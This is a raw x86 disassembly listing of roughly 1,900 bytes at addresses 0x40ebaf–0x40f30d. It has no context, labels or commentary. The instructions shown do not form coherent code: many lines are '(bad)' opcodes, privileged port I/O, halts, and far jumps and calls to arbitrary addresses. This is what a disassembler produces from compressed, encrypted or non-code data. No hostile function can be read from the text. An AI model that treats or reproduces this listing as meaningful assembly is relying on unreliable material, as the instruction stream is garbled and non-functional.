  40ebaf:	jns    0x40ebc6
  40ebb1:	jne    0x40eb90
  40ebb3:	shl    DWORD PTR [edx+0x7a60391f],0x2d
  40ebba:	ss pop ebp
  40ebbc:	mov    esp,0xa017306a
  40ebc1:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  40ebc3:	leave  
  40ebc4:	call   0xcef61972
  40ebc9:	loop   0x40ebc9
  40ebcb:	push   edx
  40ebcc:	je     0x40eb96
  40ebce:	xchg   edx,eax
  40ebcf:	mov    bh,0x6e
  40ebd1:	push   ebx
  40ebd2:	aad    0x2a
  40ebd4:	sar    BYTE PTR [ebx-0x37],1
  40ebd7:	(bad)  
  40ebd8:	repnz mov ah,0xa6
  40ebdb:	das    
  40ebdc:	push   edx
  40ebdd:	inc    ebx
  40ebde:	push   eax
  40ebdf:	lea    edi,[esi-0x6ccaa46b]
  40ebe5:	adc    al,0x1
  40ebe7:	jnp    0x40eb9c
  40ebe9:	pop    edi
  40ebea:	fs rep outs dx,BYTE PTR es:[esi]
  40ebee:	xchg   ebx,eax
  40ebef:	jmp    0xede244d1
  40ebf4:	aas    
  40ebf5:	fimul  WORD PTR [esp+edi*4]
  40ebf8:	push   ecx
  40ebf9:	ins    DWORD PTR es:[edi],dx
  40ebfa:	pop    edx
  40ebfb:	adc    eax,0xff7a82c9
  40ec00:	stos   BYTE PTR es:[edi],al
  40ec01:	xchg   edi,eax
  40ec02:	ficom  DWORD PTR [eax+esi*2-0x17]
  40ec06:	push   edx
  40ec07:	push   ss
  40ec08:	mov    dh,0xd
  40ec0a:	mov    al,0x19
  40ec0c:	mov    WORD PTR [ebp-0x6],gs
  40ec0f:	pop    edx
  40ec10:	ins    BYTE PTR es:[edi],dx
  40ec11:	xchg   ecx,eax
  40ec12:	pop    ss
  40ec13:	aam    0x1a
  40ec15:	lods   al,BYTE PTR ds:[esi]
  40ec16:	cmp    al,0xe2
  40ec18:	mov    eax,ds:0xcc5b5e39
  40ec1d:	cmp    eax,ebp
  40ec1f:	push   es
  40ec20:	nop
  40ec21:	or     DWORD PTR [ecx],ebx
  40ec23:	(bad)  
  40ec24:	hlt    
  40ec25:	fs jbe 0x40ebe7
  40ec28:	out    0x66,al
  40ec2a:	and    ah,BYTE PTR [ebp-0x56]
  40ec2d:	ja     0x40ec7c
  40ec2f:	mov    ds:0x20faf718,al
  40ec34:	mov    eax,0xe24de6a1
  40ec39:	xchg   esp,eax
  40ec3a:	cmp    al,0xdf
  40ec3c:	or     al,0x74
  40ec3e:	je     0x40ec7e
  40ec40:	pop    ds
  40ec41:	add    edx,ebx
  40ec43:	data16 aaa 
  40ec45:	adc    eax,0x66f75a18
  40ec4a:	or     ebp,DWORD PTR [edx+eiz*4]
  40ec4d:	je     0x40ec0c
  40ec4f:	dec    edx
  40ec50:	outs   dx,BYTE PTR ds:[esi]
  40ec51:	cdq    
  40ec52:	or     BYTE PTR [ebx-0x15],cl
  40ec55:	mov    ah,0xc3
  40ec57:	and    al,0x48
  40ec59:	repz sub ebp,DWORD PTR [ebp-0x1d]
  40ec5d:	mov    cl,0xf
  40ec5f:	push   cs
  40ec60:	mov    bl,0xc9
  40ec62:	inc    esi
  40ec63:	add    dh,BYTE PTR [esi-0x48]
  40ec66:	popa   
  40ec67:	mov    al,0xe6
  40ec69:	dec    edi
  40ec6a:	mov    BYTE PTR [edx],ah
  40ec6c:	cmp    DWORD PTR [eax],ebx
  40ec6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec6f:	lods   al,BYTE PTR ds:[esi]
  40ec70:	call   0x41c9c3cb
  40ec75:	pusha  
  40ec76:	jecxz  0x40ec9a
  40ec78:	in     eax,dx
  40ec79:	aad    0x7f
  40ec7b:	test   BYTE PTR [eax+ecx*4+0x4aa34aaf],dl
  40ec82:	mov    al,BYTE PTR [edi-0x11]
  40ec85:	mov    ah,al
  40ec87:	mov    ebp,0x5a481c1b
  40ec8d:	jno    0x40eca3
  40ec8f:	jnp    0x40ed04
  40ec91:	jno    0x1b66fa4c
  40ec97:	fdivr  st,st(4)
  40ec99:	sub    al,0xf6
  40ec9b:	cwde   
  40ec9c:	loope  0x40ecee
  40ec9e:	mov    ecx,0x8f90d8a3
  40eca3:	and    al,0xc
  40eca5:	cmp    ebx,esi
  40eca7:	jp     0x40ed28
  40eca9:	out    0x57,al
  40ecab:	or     DWORD PTR [ecx],ebp
  40ecad:	push   0xffffff91
  40ecaf:	or     bh,BYTE PTR [ebx-0x736caed1]
  40ecb5:	pop    ebp
  40ecb6:	push   0xffffff9c
  40ecb8:	push   edx
  40ecb9:	scas   eax,DWORD PTR es:[edi]
  40ecba:	or     eax,0x77b26732
  40ecbf:	lods   eax,DWORD PTR ds:[si]
  40ecc1:	push   0x46
  40ecc3:	loope  0x40ecd2
  40ecc5:	dec    ebp
  40ecc6:	mov    ecx,0x7fb76401
  40eccb:	xchg   ebp,eax
  40eccc:	add    eax,0x7908725a
  40ecd1:	out    0xea,eax
  40ecd3:	mov    ah,0x50
  40ecd5:	pop    esp
  40ecd6:	sbb    BYTE PTR [esi],ah
  40ecd8:	adc    ah,0x57
  40ecdb:	nop
  40ecdc:	mov    esi,0xe4ca68d3
  40ece1:	inc    edx
  40ece2:	xor    eax,edi
  40ece4:	scas   eax,DWORD PTR es:[edi]
  40ece5:	push   esi
  40ece6:	push   eax
  40ece7:	dec    esp
  40ece8:	mov    ch,0x92
  40ecea:	idiv   BYTE PTR [esi]
  40ecec:	out    dx,al
  40eced:	xor    eax,0x32c8c0ed
  40ecf2:	test   DWORD PTR [edx-0x2961783a],ebp
  40ecf8:	je     0x40ed1a
  40ecfa:	mov    al,ds:0x8728669e
  40ecff:	pop    ss
  40ed00:	in     al,0x6b
  40ed02:	fnstcw WORD PTR [ecx-0x7886a0cd]
  40ed08:	call   0xe378:0xd4b3254
  40ed0f:	leave  
  40ed10:	enter  0x9790,0x1d
  40ed14:	cmp    BYTE PTR [edi-0x37774380],bh
  40ed1a:	repz fprem1 
  40ed1d:	(bad)  
  40ed1e:	lods   al,BYTE PTR ds:[esi]
  40ed1f:	hlt    
  40ed20:	jo     0x40ed91
  40ed22:	sbb    BYTE PTR [ecx-0x1844177b],dh
  40ed28:	xor    BYTE PTR [ebx+0x42f6b56b],bl
  40ed2e:	mov    al,0xd6
  40ed30:	adc    al,0xf7
  40ed32:	sub    bh,BYTE PTR [edx]
  40ed34:	aam    0x17
  40ed36:	sbb    DWORD PTR [esi+0x54],0x7a
  40ed3a:	ss lock inc esi
  40ed3d:	mov    al,ds:0x98f356ef
  40ed42:	xchg   ebp,eax
  40ed43:	cmc    
  40ed44:	jnp    0x40ed19
  40ed46:	mov    bl,0xc0
  40ed48:	sub    esp,esp
  40ed4a:	aad    0x87
  40ed4c:	imul   edx,DWORD PTR [edx+0x3ef97779],0xabf2417a
  40ed56:	xchg   ebx,eax
  40ed57:	pop    esp
  40ed58:	push   0x6d8a106e
  40ed5d:	mov    al,0x53
  40ed5f:	pop    ds
  40ed60:	mov    bh,0xc5
  40ed62:	ficom  WORD PTR [ebp+0x2f75fc7f]
  40ed68:	(bad)  
  40ed69:	jle    0x40eda2
  40ed6b:	pop    esp
  40ed6c:	out    dx,al
  40ed6d:	imul   ebp,DWORD PTR [ebx+0x5e],0x12dc48d1
  40ed74:	ss push ebp
  40ed76:	cmp    ebp,edx
  40ed78:	mov    bl,0xa2
  40ed7a:	sbb    esp,DWORD PTR [edi]
  40ed7c:	aas    
  40ed7d:	adc    ebp,DWORD PTR [ecx+0x1587e1f2]
  40ed83:	push   es
  40ed84:	and    eax,0xbab035e4
  40ed89:	popf   
  40ed8a:	cmp    dl,BYTE PTR [ebx-0x4ca1e7f8]
  40ed90:	dec    esp
  40ed91:	adc    eax,0x6e740fa8
  40ed96:	jge    0x40ed2d
  40ed98:	imul   eax,DWORD PTR [esi],0xab3b9c75
  40ed9e:	pop    ebp
  40ed9f:	push   es
  40eda0:	cmp    BYTE PTR [ebx-0x3bb43562],ch
  40eda6:	fbstp  TBYTE PTR [ebp+0xb]
  40eda9:	pop    esi
  40edaa:	ja     0x40ed7a
  40edac:	fs aaa 
  40edae:	dec    eax
  40edaf:	fwait
  40edb0:	inc    eax
  40edb1:	iret   
  40edb2:	mov    esi,0x4011f9ee
  40edb7:	inc    esp
  40edb8:	(bad)  
  40edb9:	icebp  
  40edba:	iret   
  40edbb:	imul   DWORD PTR [edx+0x3f]
  40edbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40edbf:	adc    al,0x3f
  40edc1:	stos   DWORD PTR es:[edi],eax
  40edc2:	sbb    edi,ebp
  40edc4:	data16 ja 0x40ed79
  40edc7:	ins    DWORD PTR es:[edi],dx
  40edc8:	adc    cl,0x3f
  40edcb:	and    DWORD PTR es:[ebx],0x6660e3d1
  40edd2:	mov    ebp,eax
  40edd4:	mul    DWORD PTR [ebx+0x45]
  40edd7:	ja     0x40ee58
  40edd9:	cmc    
  40edda:	xchg   DWORD PTR [eax+0x794ccf09],esp
  40ede0:	nop
  40ede1:	retf   0x7513
  40ede4:	test   DWORD PTR [eax+0x1a],edx
  40ede7:	adc    DWORD PTR [edx-0x65],ecx
  40edea:	mov    eax,ds:0xb5b6563
  40edef:	sti    
  40edf0:	adc    esp,DWORD PTR [edx-0x21a33995]
  40edf6:	es sub al,0x16
  40edf9:	loop   0x40ed98
  40edfb:	jecxz  0x40ed9a
  40edfd:	jno    0x40edd7
  40edff:	in     al,0x24
  40ee01:	ficom  DWORD PTR [ecx+0x4c]
  40ee04:	cmp    bh,BYTE PTR [ebx-0x3f]
  40ee07:	popf   
  40ee08:	ds iret 
  40ee0a:	jmp    0x500c:0x7a6c12c6
  40ee11:	cli    
  40ee12:	popf   
  40ee13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee14:	test   eax,0x2efbd647
  40ee19:	retf   0x2f1d
  40ee1c:	sub    ebp,DWORD PTR [ebx-0x485e03ab]
  40ee22:	mov    al,ds:0x317a50
  40ee27:	add    eax,0xee82a9d1
  40ee2c:	lds    edi,FWORD PTR [esi+0x76]
  40ee2f:	mov    ebp,DWORD PTR [ecx]
  40ee31:	push   edx
  40ee32:	inc    esi
  40ee33:	lea    edi,[edx-0x2]
  40ee36:	adc    bl,bl
  40ee38:	xor    BYTE PTR [edx-0x772a30be],0xca
  40ee3f:	mov    esp,0x7325a521
  40ee44:	dec    ebx
  40ee45:	push   edx
  40ee46:	pop    ds
  40ee47:	sub    DWORD PTR [edx],ebx
  40ee49:	ret    
  40ee4a:	retf   0x4545
  40ee4d:	jmp    0xd2921838
  40ee52:	loopne 0x40ee06
  40ee54:	push   esp
  40ee55:	mov    dl,0xc2
  40ee57:	jne    0x40ee14
  40ee59:	mov    dl,0xb5
  40ee5b:	call   0xbde8537e
  40ee60:	inc    edx
  40ee61:	dec    ebp
  40ee62:	fs inc ecx
  40ee64:	mov    ss,WORD PTR [ebx+eax*2]
  40ee67:	xchg   ebx,eax
  40ee68:	push   ds
  40ee69:	stos   BYTE PTR es:[edi],al
  40ee6a:	dec    esp
  40ee6b:	mov    ah,0xc0
  40ee6d:	mov    DWORD PTR [ebx-0x3e],ecx
  40ee70:	mov    bl,0xb8
  40ee72:	cvtpi2ps xmm1,mm5
  40ee75:	inc    edi
  40ee76:	dec    eax
  40ee77:	popa   
  40ee78:	loope  0x40ee9d
  40ee7a:	adc    BYTE PTR [bp+0x3f],ah
  40ee7e:	fiadd  DWORD PTR ds:0x4be47846
  40ee84:	cwde   
  40ee85:	lods   al,BYTE PTR ds:[esi]
  40ee86:	and    al,BYTE PTR [edx]
  40ee88:	out    dx,eax
  40ee89:	sub    eax,0x1ef140bb
  40ee8e:	add    al,0xe
  40ee90:	repz fcom QWORD PTR [edx]
  40ee93:	inc    esp
  40ee94:	and    al,0x34
  40ee96:	and    DWORD PTR [ebx-0x38],0x4b93e532
  40ee9d:	inc    esp
  40ee9e:	das    
  40ee9f:	das    
  40eea0:	outs   dx,DWORD PTR ds:[esi]
  40eea1:	mov    al,0x1f
  40eea3:	dec    eax
  40eea4:	mov    bl,0x8c
  40eea6:	add    BYTE PTR [edx-0x4f8ead70],ch
  40eeac:	sub    DWORD PTR [edx],ebx
  40eeae:	jne    0x40eec9
  40eeb0:	and    bh,BYTE PTR [edi-0x12367e1e]
  40eeb6:	es mov cl,0x8f
  40eeb9:	aaa    
  40eeba:	ret    0x4a8b
  40eebd:	les    edi,FWORD PTR [ecx]
  40eebf:	jge    0x40eec8
  40eec1:	jb     0x40ef23
  40eec3:	jl     0x40eea6
  40eec5:	sbb    eax,0xa6a61748
  40eeca:	xor    bh,dl
  40eecc:	mov    dh,0x29
  40eece:	jp     0x40ef3d
  40eed0:	rcr    esp,1
  40eed2:	cli    
  40eed3:	out    0xe,eax
  40eed5:	(bad)  
  40eed6:	mov    al,0x3e
  40eed8:	stos   DWORD PTR es:[edi],eax
  40eed9:	xchg   esi,eax
  40eeda:	dec    edx
  40eedb:	or     eax,DWORD PTR [ebp+0x783c0b40]
  40eee1:	jo     0x40eeb1
  40eee3:	in     al,0x32
  40eee5:	pusha  
  40eee6:	mov    ebp,DWORD PTR [edi]
  40eee8:	fs cmp eax,0xdd1a5eb4
  40eeee:	sub    eax,0xdbf9fffe
  40eef3:	test   BYTE PTR [eax+ebp*4],0x36
  40eef7:	sbb    eax,0x87d50453
  40eefc:	and    dh,BYTE PTR [ebx+0x608aaac1]
  40ef02:	xchg   edx,eax
  40ef03:	(bad)  
  40ef04:	test   BYTE PTR [ebp-0x2f],0xb3
  40ef08:	xchg   edi,eax
  40ef09:	jb     0x40ef7d
  40ef0b:	xor    al,ah
  40ef0d:	arpl   bx,si
  40ef0f:	in     eax,dx
  40ef10:	aaa    
  40ef11:	mov    WORD PTR [ebp+ecx*1-0x262daeaa],?
  40ef18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef19:	int3   
  40ef1a:	or     eax,0xbbc4e580
  40ef1f:	mov    bh,0x53
  40ef21:	out    dx,eax
  40ef22:	ds mov bh,0x1a
  40ef25:	pop    ebx
  40ef26:	inc    edi
  40ef27:	jmp    0x40eee5
  40ef29:	cwde   
  40ef2a:	xchg   BYTE PTR [edx],dl
  40ef2c:	and    eax,0xd02728d9
  40ef31:	pushf  
  40ef32:	int3   
  40ef33:	push   es
  40ef34:	push   ebx
  40ef35:	stos   DWORD PTR es:[edi],eax
  40ef36:	pop    edx
  40ef37:	xor    al,0xd8
  40ef39:	mov    BYTE PTR [ebx-0x16],bh
  40ef3c:	sub    al,0x5
  40ef3e:	(bad)  
  40ef3f:	push   ds
  40ef40:	push   eax
  40ef41:	mov    ss,WORD PTR [ecx+0x326387ed]
  40ef47:	test   dh,dh
  40ef49:	shl    eax,0x5b
  40ef4c:	push   es
  40ef4d:	sbb    dl,dh
  40ef4f:	dec    ebx
  40ef50:	add    al,bl
  40ef52:	xchg   esp,eax
  40ef53:	mov    ah,0x9c
  40ef55:	cmp    al,0x14
  40ef57:	rol    BYTE PTR [ebx],cl
  40ef59:	sbb    al,0x51
  40ef5b:	out    0xc8,al
  40ef5d:	jnp    0x40ef47
  40ef5f:	fcomp  st(3)
  40ef61:	push   ecx
  40ef62:	mov    cs,WORD PTR [ecx]
  40ef64:	pop    esi
  40ef65:	test   eax,ecx
  40ef67:	ror    BYTE PTR [esi],cl
  40ef69:	dec    ebp
  40ef6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef6b:	xchg   BYTE PTR [edi-0x51141707],dh
  40ef71:	lea    ecx,[ecx]
  40ef73:	mov    bl,0x91
  40ef75:	adc    dh,BYTE PTR [esi-0x27a959ee]
  40ef7b:	sbb    eax,0xa6d1b47c
  40ef80:	add    esi,0xc5bc5f5e
  40ef86:	sub    dl,dl
  40ef88:	(bad)  
  40ef89:	iret   
  40ef8a:	pop    esp
  40ef8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef8c:	adc    dl,BYTE PTR [eax+0x1e55c040]
  40ef92:	xor    al,0xeb
  40ef94:	sub    al,0xd9
  40ef96:	es xor ecx,eax
  40ef99:	dec    esp
  40ef9a:	repnz clc 
  40ef9c:	and    al,0xa5
  40ef9e:	lods   al,BYTE PTR ds:[esi]
  40ef9f:	pop    ecx
  40efa0:	(bad)  
  40efa1:	mov    edi,0xda77e0b
  40efa6:	cmp    ebp,ebp
  40efa8:	shr    DWORD PTR [esi+0x38],1
  40efab:	mov    ds:0xba991570,al
  40efb0:	gs xor eax,0x18ecfdfc
  40efb6:	and    BYTE PTR [edx],0x1
  40efb9:	test   DWORD PTR [ecx+edx*1+0x152e7653],edi
  40efc0:	int    0x84
  40efc2:	ins    DWORD PTR es:[edi],dx
  40efc3:	mov    ds:0x9245c6d9,eax
  40efc8:	stos   BYTE PTR es:[edi],al
  40efc9:	adc    eax,0x3a712601
  40efce:	fisttp QWORD PTR [edi+0x62]
  40efd1:	popa   
  40efd2:	inc    ecx
  40efd3:	cmc    
  40efd4:	add    BYTE PTR [edi+0x73],bh
  40efd7:	sub    al,0x4d
  40efd9:	imul   esp,DWORD PTR [ecx+eax*8],0x3e63d694
  40efe0:	pop    esp
  40efe1:	xchg   edx,eax
  40efe2:	fcmovnbe st,st(4)
  40efe4:	out    dx,eax
  40efe5:	stos   DWORD PTR es:[edi],eax
  40efe6:	ins    BYTE PTR es:[edi],dx
  40efe7:	push   esi
  40efe8:	inc    ecx
  40efe9:	dec    esp
  40efea:	aaa    
  40efeb:	jge    0x40f036
  40efed:	test   esp,esp
  40efef:	enter  0x2402,0x24
  40eff3:	push   ebp
  40eff4:	out    0x38,eax
  40eff6:	or     bl,bl
  40eff8:	arpl   WORD PTR ds:0x26909aae,bx
  40effe:	test   BYTE PTR [ebx],ah
  40f000:	outs   dx,DWORD PTR ds:[esi]
  40f001:	ror    DWORD PTR [edx],1
  40f003:	sub    edi,DWORD PTR [ebp-0x50]
  40f006:	lods   eax,DWORD PTR ds:[esi]
  40f007:	repnz adc eax,0x469a2b48
  40f00e:	fwait
  40f00f:	mov    DWORD PTR [ecx],ebx
  40f011:	push   eax
  40f012:	mov    dl,0x76
  40f014:	mov    esi,0x146e27ed
  40f019:	mov    eax,0xdcb4c37b
  40f01e:	mov    ebp,0x9d4302e5
  40f023:	push   ds
  40f024:	jmp    0x7922:0x31940f3d
  40f02b:	cmp    al,cl
  40f02d:	pop    ecx
  40f02e:	or     bh,bl
  40f030:	push   ss
  40f031:	and    al,0xd8
  40f033:	test   eax,0x157cc1d9
  40f039:	das    
  40f03a:	xor    DWORD PTR [ecx],ebp
  40f03c:	ins    BYTE PTR es:[edi],dx
  40f03d:	aas    
  40f03e:	push   ss
  40f03f:	fst    st(6)
  40f041:	cmp    eax,0x915508b6
  40f046:	cli    
  40f047:	push   ebp
  40f048:	popf   
  40f049:	inc    eax
  40f04a:	push   edx
  40f04b:	xchg   ecx,eax
  40f04c:	adc    dh,cl
  40f04e:	mov    ds:0x186077e3,eax
  40f053:	out    0xcf,eax
  40f055:	ja     0x40f008
  40f057:	push   eax
  40f059:	sub    BYTE PTR [edx-0x1f],0x20
  40f05d:	(bad)  
  40f05f:	and    al,0x9f
  40f061:	aad    0x6d
  40f063:	adc    BYTE PTR [edi+0x72dbeb5f],ch
  40f069:	mov    WORD PTR ds:0x95b23f35,cs
  40f06f:	mov    ebp,DWORD PTR ds:0x131318fc
  40f075:	xchg   BYTE PTR [ecx+0x4c413a8c],dh
  40f07b:	jns    0x40f0af
  40f07d:	es mov dh,0xf4
  40f080:	scas   al,BYTE PTR es:[edi]
  40f081:	add    BYTE PTR [edi+0x39],dl
  40f084:	fist   WORD PTR [edi+0x173e6fea]
  40f08a:	rcr    eax,0x18
  40f08d:	cmp    eax,0x55afabdc
  40f092:	fbld   TBYTE PTR [ecx]
  40f094:	(bad)  
  40f095:	popa   
  40f096:	pop    ds
  40f097:	jg     0x40f09f
  40f099:	push   ebx
  40f09a:	xor    dh,BYTE PTR [edx+ebp*2]
  40f09d:	or     al,0x58
  40f09f:	pop    es
  40f0a0:	jae    0x40f07f
  40f0a2:	cs ret 0x9193
  40f0a6:	xor    ah,BYTE PTR [eax]
  40f0a8:	adc    ebx,edi
  40f0aa:	push   ebp
  40f0ab:	into   
  40f0ac:	cmp    BYTE PTR [ecx],0xed
  40f0af:	mov    WORD PTR [ebx+0x2e],fs
  40f0b2:	mov    ebx,0xf65e0482
  40f0b7:	cwde   
  40f0b8:	or     DWORD PTR [ecx],0x676e9366
  40f0be:	(bad)  
  40f0bf:	or     BYTE PTR [ebx+esi*4+0x6],0x8f
  40f0c4:	retf   
  40f0c5:	push   eax
  40f0c6:	add    esi,DWORD PTR [ebx+0x73aecc98]
  40f0cc:	mov    al,ds:0x9913740a
  40f0d1:	xor    dl,BYTE PTR [edx-0x66]
  40f0d4:	inc    ebp
  40f0d5:	and    al,0xc8
  40f0d7:	xchg   dh,bh
  40f0d9:	fidivr DWORD PTR [edi+0x25]
  40f0dc:	enter  0x5a64,0x6d
  40f0e0:	inc    edi
  40f0e1:	adc    BYTE PTR [edx+ebx*2+0xed5332d],dh
  40f0e8:	clc    
  40f0e9:	mov    DWORD PTR [edi-0x681ea28],edx
  40f0ef:	xor    al,0xd8
  40f0f1:	nop
  40f0f2:	call   FWORD PTR [ebp+0x6b67c71d]
  40f0f8:	addr16 cmc 
  40f0fa:	xchg   edx,eax
  40f0fb:	jp     0x40f15c
  40f0fd:	and    BYTE PTR [edx-0xebbbdc3],dl
  40f103:	(bad)  
  40f104:	call   0x174fbfd3
  40f109:	sbb    BYTE PTR [ebx],0xeb
  40f10c:	pop    ecx
  40f10d:	adc    edx,0xc5db26d6
  40f113:	push   eax
  40f114:	pop    edi
  40f115:	les    edx,FWORD PTR [ebx-0x780c87a1]
  40f11b:	push   edx
  40f11c:	jmp    0x40f196
  40f11e:	dec    ebp
  40f11f:	popf   
  40f120:	fnstcw WORD PTR [edx-0x50]
  40f123:	mov    bh,0x8a
  40f125:	test   DWORD PTR [edi+0x1390d0ec],eax
  40f12b:	push   ss
  40f12c:	retf   
  40f12d:	push   esp
  40f12e:	dec    ebx
  40f12f:	in     al,0xe2
  40f131:	xor    ecx,edi
  40f133:	mov    ebp,0x40ed1aa9
  40f138:	nop
  40f139:	sbb    al,0x2
  40f13b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f13c:	adc    dl,BYTE PTR [eax*4+0x1a92194c]
  40f143:	cwde   
  40f144:	pop    esi
  40f145:	add    ah,dh
  40f147:	in     eax,dx
  40f148:	pusha  
  40f149:	sbb    BYTE PTR [edi-0x4a054468],al
  40f14f:	xchg   edi,eax
  40f150:	and    dh,BYTE PTR [esi-0x51]
  40f153:	jae    0x40f17a
  40f155:	call   0x114c:0x7505d89d
  40f15c:	ret    0xf2f8
  40f15f:	push   cs
  40f160:	sub    ah,BYTE PTR ds:0xb1defa14
  40f166:	pop    eax
  40f167:	int    0x8b
  40f169:	out    dx,al
  40f16a:	data16 shl dh,0xb6
  40f16e:	cmp    DWORD PTR [ebx-0x49],ecx
  40f171:	(bad)  
  40f172:	in     al,dx
  40f173:	(bad)  
  40f174:	fs aad 0x68
  40f177:	inc    edx
  40f178:	int3   
  40f179:	loop   0x40f1e2
  40f17b:	mov    al,ds:0xef6d767
  40f180:	or     esp,esi
  40f182:	mov    eax,ds:0xbc4cad2d
  40f187:	jmp    0xb66a:0x94f2b23b
  40f18e:	cmp    al,BYTE PTR [ecx-0x9]
  40f191:	add    edi,DWORD PTR [ebp-0x3af7d87e]
  40f197:	mov    al,0x61
  40f199:	js     0x40f1fd
  40f19b:	test   DWORD PTR [esp+ebx*4+0x4fad4226],ebx
  40f1a2:	es jo  0x40f1cd
  40f1a5:	sub    cl,BYTE PTR [edi-0x3b724ad0]
  40f1ab:	into   
  40f1ac:	add    edi,ebp
  40f1ae:	push   edx
  40f1af:	mov    BYTE PTR ss:[esi],bh
  40f1b2:	or     dl,cl
  40f1b4:	retf   
  40f1b5:	ss pop es
  40f1b7:	in     eax,0x69
  40f1b9:	pop    ds
  40f1ba:	test   ecx,ebp
  40f1bc:	ret    
  40f1bd:	push   ecx
  40f1be:	les    ebp,FWORD PTR [ecx+0x77]
  40f1c1:	aad    0xbb
  40f1c3:	mov    cl,0xeb
  40f1c5:	int3   
  40f1c6:	aaa    
  40f1c7:	je     0x40f17e
  40f1c9:	xor    bl,BYTE PTR [ecx-0x1f]
  40f1cc:	mov    edi,0xfe292c62
  40f1d1:	fadd   QWORD PTR [edx-0x4fda5ce6]
  40f1d7:	div    BYTE PTR [ebx+eiz*2-0x23]
  40f1db:	js     0x40f228
  40f1dd:	stc    
  40f1de:	lock and esi,0xffffffe1
  40f1e2:	sti    
  40f1e3:	je     0x40f19f
  40f1e5:	sbb    BYTE PTR [esi+0x86da88],al
  40f1eb:	fild   DWORD PTR [edx+0x65]
  40f1ee:	sbb    cl,cl
  40f1f0:	jl     0x40f1d9
  40f1f2:	pop    ebx
  40f1f3:	fiadd  DWORD PTR [edi+0x22]
  40f1f6:	adc    ch,BYTE PTR [eax]
  40f1f8:	add    al,0x8d
  40f1fa:	xchg   edx,eax
  40f1fb:	xchg   ecx,eax
  40f1fc:	in     eax,0x8f
  40f1fe:	dec    eax
  40f1ff:	mov    BYTE PTR [ecx],ah
  40f201:	pop    esp
  40f202:	out    dx,eax
  40f203:	jg     0x40f1de
  40f205:	mov    ch,0x96
  40f207:	xor    eax,esp
  40f209:	pop    es
  40f20a:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  40f20c:	jae    0x40f1ad
  40f20e:	neg    DWORD PTR [eax]
  40f210:	std    
  40f211:	aas    
  40f212:	add    BYTE PTR [ebx],dl
  40f214:	pop    esi
  40f215:	dec    eax
  40f216:	test   eax,0x204c2c55
  40f21b:	inc    ebx
  40f21c:	xchg   ebp,eax
  40f21d:	jno    0x40f216
  40f21f:	mov    dl,BYTE PTR ds:[esp+edi*4-0x745e6013]
  40f227:	pop    ecx
  40f228:	sti    
  40f229:	mov    WORD PTR [edx+0x30],fs
  40f22c:	mov    ds:0x6df13cd6,eax
  40f231:	iret   
  40f232:	mov    ecx,0xf02d5872
  40f237:	(bad)  
  40f238:	gs dec ebp
  40f23a:	add    cl,BYTE PTR [ebp-0x137f155a]
  40f240:	aad    0x52
  40f242:	sbb    al,0xeb
  40f244:	jge    0x40f1e3
  40f246:	and    DWORD PTR ds:0xdc97b92d,esi
  40f24c:	cmp    al,0xcc
  40f24e:	cmpxchg BYTE PTR [edi+0x6b],al
  40f252:	sbb    DWORD PTR [edi+eiz*2],eax
  40f255:	and    BYTE PTR [ebx],0xb8
  40f258:	mov    eax,ds:0xa249c214
  40f25d:	pop    es
  40f25e:	mov    edx,0x91bb5af1
  40f263:	xchg   DWORD PTR [edx],edi
  40f265:	xor    DWORD PTR [ebp-0x10],edx
  40f268:	retf   0x998c
  40f26b:	loope  0x40f1fa
  40f26d:	mov    WORD PTR [ebx],?
  40f26f:	rol    BYTE PTR [ebx-0x76],1
  40f272:	call   0xa89f:0xa0a9ea4d
  40f279:	inc    esp
  40f27a:	or     eax,0x48b5b821
  40f27f:	pop    esi
  40f280:	xor    BYTE PTR [edx],0xad
  40f283:	xchg   ebp,eax
  40f284:	mov    eax,0xd53ba4db
  40f289:	mov    DWORD PTR gs:[edx-0x37],esp
  40f28d:	push   ds
  40f28e:	(bad)  
  40f28f:	fsubr  DWORD PTR [ebx+0x2c]
  40f292:	or     BYTE PTR [edx+0x6b],al
  40f295:	dec    edx
  40f296:	sub    al,0x16
  40f298:	and    ecx,ecx
  40f29a:	jecxz  0x40f2b4
  40f29c:	fbstp  TBYTE PTR [edx-0x7a]
  40f29f:	add    eax,0xb10fcdc5
  40f2a4:	sub    ch,ah
  40f2a6:	out    0xdb,eax
  40f2a8:	in     eax,0x9c
  40f2aa:	mov    dh,0xb0
  40f2ac:	test   al,0x97
  40f2ae:	(bad)  
  40f2af:	xchg   ebp,eax
  40f2b0:	mov    ah,0xfe
  40f2b2:	and    edx,DWORD PTR [edi-0x6ad8c841]
  40f2b8:	add    cx,ax
  40f2bb:	pusha  
  40f2bc:	mov    ds:0xfc44f3b7,al
  40f2c1:	or     esp,ebp
  40f2c3:	xchg   ebx,eax
  40f2c4:	xchg   esp,eax
  40f2c5:	xchg   esp,eax
  40f2c6:	adc    al,0x30
  40f2c8:	test   DWORD PTR [eax],esp
  40f2ca:	sub    al,0xce
  40f2cc:	mov    BYTE PTR [ebp+0x4b],cl
  40f2cf:	aad    0xdb
  40f2d1:	out    dx,eax
  40f2d2:	lea    esp,[edx]
  40f2d4:	xor    edi,DWORD PTR [ecx+edi*4+0x5d]
  40f2d8:	jae    0x40f301
  40f2da:	xor    ebx,DWORD PTR [esi+0x5ec17d6f]
  40f2e0:	inc    edi
  40f2e1:	or     al,0xe
  40f2e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f2e4:	mov    WORD PTR [ebx+0xd],ds
  40f2e7:	out    dx,al
  40f2e8:	(bad)  
  40f2e9:	shl    BYTE PTR [edi-0x6c0b4f58],1
  40f2ef:	jp     0x40f2dc
  40f2f1:	ror    BYTE PTR [ebx],0x4
  40f2f4:	mov    dh,bl
  40f2f6:	sub    DWORD PTR [edi+0x5f],ebp
  40f2f9:	mov    BYTE PTR [ebx+0x39],ah
  40f2fc:	pop    ebx
  40f2fd:	lock gs (bad) 
  40f301:	hlt    
  40f302:	ror    DWORD PTR [edi-0x66],1
  40f305:	cmc    
  40f306:	pop    edx
  40f307:	adc    edx,DWORD PTR [esi+0x66809a5f]
  40f30d:	mov    WORD PTR [eax-0x1a],?
